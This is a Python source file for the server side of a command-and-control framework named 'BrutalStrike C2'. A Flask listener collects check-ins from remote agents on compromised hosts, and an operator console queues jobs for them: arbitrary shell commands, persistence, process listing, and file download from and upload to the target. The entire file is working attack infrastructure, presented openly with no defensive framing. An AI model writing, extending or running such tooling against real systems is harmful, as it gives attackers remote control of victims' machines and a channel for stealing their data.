#!/usr/bin/env python3
import sys
import os
import threading
import time
import sqlite3
import json
import socket
from datetime import datetime
from flask import Flask, request, jsonify

print("=== BrutalStrike C2 Framework - Enhanced Edition ===")

class HTTPListener:
    def __init__(self, host='0.0.0.0', port=8443):
        self.host = host
        self.port = port
        self.app = Flask(__name__)
        self.agents = {}
        self.jobs = {}
        self.running = False
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/beacon', methods=['POST'])
        def beacon():
            try:
                data = request.get_json()
                agent_id = data.get('agent_id')
                system_info = data.get('system_info', {})
                
                print(f"[+] Agent check-in: {agent_id} from {request.remote_addr}")
                print(f"    Hostname: {system_info.get('hostname', 'Unknown')}")
                print(f"    User: {system_info.get('username', 'Unknown')}")
                
                # Store agent
                self.agents[agent_id] = {
                    'last_seen': datetime.now(),
                    'system_info': system_info,
                    'ip': request.remote_addr
                }
                
                # Send pending jobs
                jobs = self.jobs.get(agent_id, [])
                if jobs:
                    print(f"    Sending {len(jobs)} jobs to agent")
                
                # Clear sent jobs
                if agent_id in self.jobs:
                    del self.jobs[agent_id]
                
                return jsonify({'jobs': jobs})
                
            except Exception as e:
                print(f"[-] Beacon error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/result', methods=['POST'])
        def result():
            try:
                data = request.get_json()
                agent_id = data.get('agent_id')
                job_id = data.get('job_id')
                output = data.get('output', '')
                
                print(f"\n[📡] JOB RESULT from {agent_id}:")
                print(f"    Job: {job_id}")
                print(f"    Output:\n{'-'*40}")
                print(f"{output}")
                print(f"{'-'*40}")
                print(f"C2> ", end='', flush=True)  # Keep prompt visible
                
                return jsonify({'status': 'received'})
                
            except Exception as e:
                print(f"[-] Result error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/health', methods=['GET'])
        def health():
            return jsonify({'status': 'healthy'})
    
    def create_job(self, agent_id, module_name, arguments=None):
        job_id = f"job_{datetime.now().strftime('%H%M%S')}"
        job = {
            'job_id': job_id,
            'module_name': module_name,
            'arguments': arguments or {}
        }
        
        if agent_id not in self.jobs:
            self.jobs[agent_id] = []
        
        self.jobs[agent_id].append(job)
        return job_id
    
    def start(self):
        print(f"[+] Starting HTTP listener on {self.host}:{self.port}")
        self.running = True
        
        def run_flask():
            self.app.run(host=self.host, port=self.port, debug=False, threaded=True, use_reloader=False)
        
        self.thread = threading.Thread(target=run_flask)
        self.thread.daemon = True
        self.thread.start()
        time.sleep(2)
        print("[✓] HTTP listener ready")

class C2Server:
    def __init__(self):
        self.running = False
        self.listener = None
        self.current_agent = None  # For interactive mode
    
    def start(self):
        print("[+] Starting C2 Server...")
        self.running = True
        
        # Start HTTP listener
        self.listener = HTTPListener('0.0.0.0', 8443)
        self.listener.start()
        
        # Start command interface
        self.start_command_interface()
        
        print("\n" + "="*60)
        print("[✓] BrutalStrike C2 Framework Ready!")
        print(f"[✓] HTTP Listener: 0.0.0.0:{self.listener.port}")
        print(f"[✓] Agents connect to: http://YOUR_IP:{self.listener.port}/beacon")
        print("[✓] Type 'help' for commands")
        print("="*60)
        print("\n💡 TIP: Use 'jobs <agent_id> <module>' to send commands to agents")
        print("   Example: jobs abc123 shell whoami")
        print("   Example: jobs abc123 sysinfo")
        print()
        
        # Keep alive
        while self.running:
            time.sleep(1)
    
    def start_command_interface(self):
        def command_loop():
            while self.running:
                try:
                    # Show current agent in prompt if in interactive mode
                    if self.current_agent:
                        prompt = f"\nC2[{self.current_agent[:8]}]> "
                    else:
                        prompt = "\nC2> "
                    
                    cmd = input(prompt).strip()
                    self.handle_command(cmd)
                except (KeyboardInterrupt, EOFError):
                    print("\n[!] Shutting down...")
                    self.running = False
                    break
                except Exception as e:
                    print(f"[-] Command error: {e}")
        
        thread = threading.Thread(target=command_loop)
        thread.daemon = True
        thread.start()
    
    def handle_command(self, command):
        if command == 'exit':
            self.running = False
        elif command == 'agents':
            self.list_agents()
        elif command == 'status':
            self.show_status()
        elif command == 'help':
            self.show_help()
        elif command.startswith('jobs '):
            self.handle_job(command)
        elif command.startswith('use '):
            self.handle_use(command)
        elif command == 'back':
            self.handle_back()
        elif command == 'clear':
            os.system('clear')
        elif command == '':
            pass
        else:
            print("Unknown command. Type 'help'")
    
    def handle_use(self, command):
        """Enter interactive mode with specific agent"""
        parts = command.split(' ')
        if len(parts) < 2:
            print("Usage: use <agent_id>")
            return
        
        agent_id = parts[1]
        if agent_id in self.listener.agents:
            self.current_agent = agent_id
            agent_info = self.listener.agents[agent_id]
            sysinfo = agent_info.get('system_info', {})
            print(f"[+] Interactive mode with agent {agent_id[:8]}...")
            print(f"    Hostname: {sysinfo.get('hostname', 'Unknown')}")
            print(f"    User: {sysinfo.get('username', 'Unknown')}")
            print(f"    Type commands directly or 'back' to exit")
        else:
            print(f"[-] Agent {agent_id} not found")
    
    def handle_back(self):
        """Exit interactive mode"""
        if self.current_agent:
            print(f"[+] Exiting interactive mode with agent {self.current_agent[:8]}...")
            self.current_agent = None
        else:
            print("[-] Not in interactive mode")
    
    def list_agents(self):
        agents = self.listener.agents
        if not agents:
            print("No active agents")
            return
        
        print(f"\nActive Agents ({len(agents)}):")
        print("=" * 70)
        for agent_id, info in agents.items():
            sysinfo = info.get('system_info', {})
            print(f"ID: {agent_id}")
            print(f"  IP: {info.get('ip', 'Unknown')}")
            print(f"  Hostname: {sysinfo.get('hostname', 'Unknown')}")
            print(f"  User: {sysinfo.get('username', 'Unknown')}")
            print(f"  OS: {sysinfo.get('os_version', 'Unknown')}")
            print(f"  Last seen: {info.get('last_seen')}")
            print("-" * 70)
    
    def show_status(self):
        agent_count = len(self.listener.agents)
        job_count = sum(len(jobs) for jobs in self.listener.jobs.values())
        
        print(f"\nC2 Server Status:")
        print(f"  Active agents: {agent_count}")
        print(f"  Pending jobs: {job_count}")
        print(f"  Listener: 0.0.0.0:{self.listener.port}")
        print(f"  Interactive mode: {'Yes' if self.current_agent else 'No'}")
    
    def show_help(self):
        print("\n📖 Available Commands:")
        print("  agents                    - List active agents")
        print("  status                    - Show server status")
        print("  use <agent_id>            - Enter interactive mode with agent")
        print("  back                      - Exit interactive mode")
        print("  jobs <agent_id> <module> [args] - Send job to agent")
        print("  clear                     - Clear screen")
        print("  exit                      - Shutdown server")
        print("  help                      - Show this help")
        
        print("\n🛠️ Available Modules (use with 'jobs' command):")
        print("  shell <command>           - Execute system command")
        print("  sysinfo                   - Get detailed system information")
        print("  persistence [method]      - Establish persistence")
        print("  process_list              - List running processes")
        print("  download <file>           - Download file from target")
        print("  upload <local> <remote>   - Upload file to target")
        
        if self.current_agent:
            print(f"\n💡 You're in interactive mode with agent {self.current_agent[:8]}")
            print("   Type commands directly to send to this agent")
            print("   Example: shell whoami")
            print("   Example: sysinfo")
    
    def handle_job(self, command):
        try:
            parts = command.split(' ', 3)
            if len(parts) < 3:
                print("Usage: jobs <agent_id> <module> [arguments]")
                print("Examples:")
                print("  jobs abc123 shell whoami")
                print("  jobs abc123 sysinfo")
                print("  jobs abc123 shell 'ls -la'")
                return
            
            agent_id = parts[1]
            module_name = parts[2]
            arguments = parts[3] if len(parts) > 3 else ""
            
            if agent_id not in self.listener.agents:
                print(f"[-] Agent {agent_id} not found or not active")
                return
            
            # Parse arguments
            args_dict = {}
            if arguments:
                if module_name == 'shell':
                    args_dict = {'command': arguments}
                else:
                    try:
                        args_dict = json.loads(arguments)
                    except:
                        args_dict = {'args': arguments}
            
            job_id = self.listener.create_job(agent_id, module_name, args_dict)
            print(f"[✓] Job {job_id} queued for agent {agent_id}")
            print(f"    Module: {module_name}")
            if args_dict:
                print(f"    Arguments: {args_dict}")
            
        except Exception as e:
            print(f"[-] Job creation failed: {e}")

if __name__ == "__main__":
    server = C2Server()
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
    except Exception as e:
        print(f"[-] Server error: {e}")